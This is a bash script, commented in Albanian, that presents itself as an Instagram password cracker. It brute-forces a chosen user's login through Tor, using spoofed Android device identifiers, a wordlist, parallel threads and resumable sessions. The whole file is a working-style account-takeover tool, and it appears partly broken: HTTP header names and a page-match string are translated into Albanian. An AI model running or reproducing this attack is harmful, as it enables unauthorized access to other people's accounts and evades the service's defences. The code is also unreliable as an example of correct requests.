#!/bin/bash

# Funksioni për të dalë nga skripti
dalje() {
    exit $1
}

trap 'ruaj;dalje 1' 2

string4=$(openssl rand -hex 32 | cut -c 1-4)
string8=$(openssl rand -hex 32  | cut -c 1-8)
string12=$(openssl rand -hex 32 | cut -c 1-12)
string16=$(openssl rand -hex 32 | cut -c 1-16)
pajisje="android-$string16"
uuid=$(openssl rand -hex 32 | cut -c 1-32)
telefon="$string8-$string4-$string4-$string4-$string12"
guid="$string8-$string4-$string4-$string4-$string12"
var=$(curl -i -s -H "$header" https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid > /dev/null)
var2=$(echo $var | awk -F ';' '{print $2}' | cut -d '=' -f3)

kontrolloroot() {
if [[ "$(id -u)" -ne 0 ]]; then
    printf "\e[1;77m 🛡️ Ju lutemi, ekzekutoni këtë program si root!\n\e[0m"
    dalje 1
fi
}

varësitë() {

command -v openssl > /dev/null 2>&1 || { echo >&2 "❌ Kërkoj openssl por nuk është instaluar. Po ndaloj."; dalje 1; }
command -v tor > /dev/null 2>&1 || { echo >&2 "❌ Kërkoj tor por nuk është instaluar. Po ndaloj."; dalje 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "❌ Kërkoj curl por nuk është instaluar. Po ndaloj."; dalje 1; }
command -v awk > /dev/null 2>&1 || { echo >&2 "❌ Kërkoj awk por nuk është instaluar. Po ndaloj."; dalje 1; }
command -v cat > /dev/null 2>&1 || { echo >&2 "❌ Kërkoj cat por nuk është instaluar. Po ndaloj."; dalje 1; }
command -v tr > /dev/null 2>&1 || { echo >&2 "❌ Kërkoj tr por nuk është instaluar. Po ndaloj."; dalje 1; }
command -v wc > /dev/null 2>&1 || { echo >&2 "❌ Kërkoj wc por nuk është instaluar. Po ndaloj."; dalje 1; }
command -v cut > /dev/null 2>&1 || { echo >&2 "❌ Kërkoj cut por nuk është instaluar. Po ndaloj."; dalje 1; }
command -v uniq > /dev/null 2>&1 || { echo >&2 "❌ Kërkoj uniq por nuk është instaluar. Po ndaloj."; dalje 1; }
command -v sed > /dev/null 2>&1 || { echo >&2 "❌ Kërkoj sed por nuk është instaluar. Po ndaloj."; dalje 1; }
if [ $(ls /dev/urandom >/dev/null; echo $?) == "1" ]; then
echo "/dev/urandom nuk u gjet!"
dalje 1
fi

}

baneri() {

printf "\n"
printf "\e[1;77m\e[45m   Instagram Password Cracker - Nga Mirsad Neshati  \e[0m\n"
printf "\n"
}

cat <<EOF
Ky Skript është Dizajnuar Dhe Zhvilluar
Nga Mirsad Neshati 
Nën - Licencën e Përgjithshme Publike GNU v3.0 (GPL-3.0)
Kjo Do të Thotë - Se nëse dikush përdor ose modifikon këtë kod,
Ata duhet të lëshojnë gjithashtu punën derivative nën të njëjtat kushte,
Duke e bërë atë subjekt të të drejtave të autorit dhe kushteve të njëjta të licencës.
EOF

function nis() {
baneri
kontrolloroot
varësitë
read -p $'\e[1;92m 📝 Fut Emrin e Përdoruesit për Llogarinë: \e[0m' perdorues
kontrollollogarinë=$(curl -s https://www.instagram.com/$perdorues/?__a=1 | grep -c "Përdoruesi Mund të Jetë Ndaluar Ose Faqja Duke U Fshirë/Non-Egzistencë/Pa Përdorues (Me këtë emër përdoruesi)")
if [[ "$kontrollollogarinë" == 1 ]]; then
printf "\e[1;91m ❌ Emër Përdoruesi i Pavlefshëm! Provo Përsëri\e[0m\n"
sleep 1
nis
else
lista_fjalekalimeve_def="lista-fjalekalimeve-default.lst"
read -p $'\e[1;92m 📃 Fut Emrin e Listës së Personalizuar të Fjalëkalimeve (Shtyp Enter për Listën e Paracaktuar): \e[0m' lista_fjalekalimeve
lista_fjalekalimeve="${lista_fjalekalimeve:-${lista_fjalekalimeve_def}}"
threadet_def="15"
read -p $'\e[1;92m 🔗 Threadet Për Të Përdorur Gjatë Testimit të Fjalëkalimeve: (Gjithmonë Përdorni < 20, Default-15): \e[0m' threadet
threadet="${threadet:-${threadet_def}}"
fi
}

kontrollotor() {

kontrollo=$(curl --socks5 localhost:9050 -s https://check.torproject.org > /dev/null; echo $?)

if [[ "$kontrollo" -gt 0 ]]; then
printf "\e[1;91m 🧅 Ju lutemi, kontrolloni lidhjen tuaj TOR! Thjesht shkruani tor ose shërbimi tor start\n\e[0m"
dalje 1
fi

}

function ruaj() {

if [[ -n "$threadet" ]]; then
printf "\e[1;91m [*] Duke pritur mbylljen e thread-eve...\n\e[0m"
if [[ "$threadet" -gt 10 ]]; then
sleep 6
else
sleep 3
fi
sesioni_default="Y"
printf "\n\e[1;77m 📲 Ruaj sesionin për përdoruesin \e[0m\e[1;92m %s \e[0m" $perdorues
read -p $'\e[1;77m? ❓ [Y/n]: \e[0m' sesion
sesion="${sesion:-${sesioni_default}}"
if [[ "$sesion" == "Y" || "$sesion" == "y" || "$sesion" == "po" || "$sesion" == "Po" ]]; then
if [[ ! -d sesione ]]; then
mkdir sesione
fi
printf "perdorues=\"%s\"\nfjalekalimi=\"%s\"\nlista_fjalekalimeve=\"%s\"\n" $perdorues $fjalekalimi $lista_fjalekalimeve > sesione/ruaj.sesion.$perdorues.$(date +"%FT%H%M")
printf "\e[1;77m ✔️ Sesioni u ruajt.\e[0m\n"
printf "\e[1;92m Përdor ./instashell --vazhdo\n"
else
dalje 1
fi
else
dalje 1
fi
}

function rifillo() {

default_sesion=$(ls sesione/ruaj.sesion.* | sort -r | head -n 1)
read -p $'\e[1;92m Fut emrin e sesionit për të vazhduar, ose Enter për të vazhduar me sesionin më të fundit ('$default_sesion'):\e[0m' sesion_i_vazhdimit
sesion_i_vazhdimit="${sesion_i_vazhdimit:-${default_sesion}}"

if [[ ! -e "$sesion_i_vazhdimit" ]]; then
printf "\e[1;91m ❌ Sesioni i zgjedhur nuk ekziston!\e[0m\n"
dalje 1
fi

source $sesion_i_vazhdimit
kontrollollogarinë=$(curl -s https://www.instagram.com/$perdorues/?__a=1 | grep -c "Përdoruesi Mund të Jetë Ndaluar Ose Faqja Duke U Fshirë/Non-Egzistencë/Pa Përdorues (Me këtë emër përdoruesi)")
if [[ "$kontrollollogarinë" == 1 ]]; then
printf "\e[1;91m ❌ Emër Përdoruesi i Pavlefshëm! Provo Përsëri\e[0m\n"
sleep 1
rifillo
else
threadet_def="15"
read -p $'\e[1;92m 🔗 Threadet Për Të Përdorur Gjatë Testimit të Fjalëkalimeve: (Gjithmonë Përdorni < 20, Default-15): \e[0m' threadet
threadet="${threadet:-${threadet_def}}"
fi

nis_trupe

}

function nis_trupe() {
kontrollotor
while read fjalekalimi; do
{
nuk_gjetur="\e[1;91m [❌] \e[0m"
gjetur="\e[1;92m [✔️] \e[0m"
kontrollollogarinë=$(curl --socks5 localhost:9050 -s -c -H "Përdorues-Agjenti: Instagram 123.0.0.21.114 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)" \
-H "Pajisja-ID: $pajisje" \
-H "UUID: $uuid" \
-H "Karakteristikat: $var2" \
-H "Pranimi: */*" \
-H "Përmbajtja-Tipi: aplikacion/x-www-form-urlencoded; charset=UTF-8" \
-H "Indikatori: pasword; shëno" \
-H "Aplikacion: shpejtësia e paraqitjes së reagimit" \
-H "Lidhja: mbajë e gjallë" \
-d "username=$perdorues&enc_password=#PWD_INSTAGRAM_BROWSER:0:$(date +%s):$fjalekalimi" \
--write-out "%{http_code}" \
"https://i.instagram.com/api/v1/accounts/login/" --connect-timeout 10 --max-time 30)

if [[ $kontrollollogarinë == 200 ]]; then
printf "$gjetur Fjalëkalimi i Saktë Gjetur: $fjalekalimi\n"
ruaj
dalje 1
else
printf "$nuk_gjetur Fjalëkalimi: $fjalekalimi\n"
fi
} <&3 &
done 3< $lista_fjalekalimeve
wait
}

argumente() {
while [[ $# -ge 1 ]]; do
case $1 in
  --rifillo) rifillo; dalje ;;
  *) printf "\e[1;91m Komandë e Panjohur: %s\n\e[0m" "$1"; dalje ;;
esac
done
}

kontrollotor
argumente "$@"
nis
nis_trupe
